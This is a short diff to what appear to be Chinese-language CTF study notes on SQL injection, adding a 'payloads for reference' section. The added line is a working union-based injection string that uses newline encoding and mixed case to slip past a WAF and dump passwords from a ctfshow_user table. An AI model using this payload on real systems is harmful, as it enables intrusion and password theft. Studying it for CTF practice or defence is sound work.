@@ -39,5 +39,12 @@
 
 <br>
 
+## 一些可以参考的playload
+* 1'%0aunion%0asElect%0a1,2,%0agroup_concat(password)%0afrom%0actfshow_user%23
+
+
+
+<br>
+
 ## waf绕过
 * 大小写
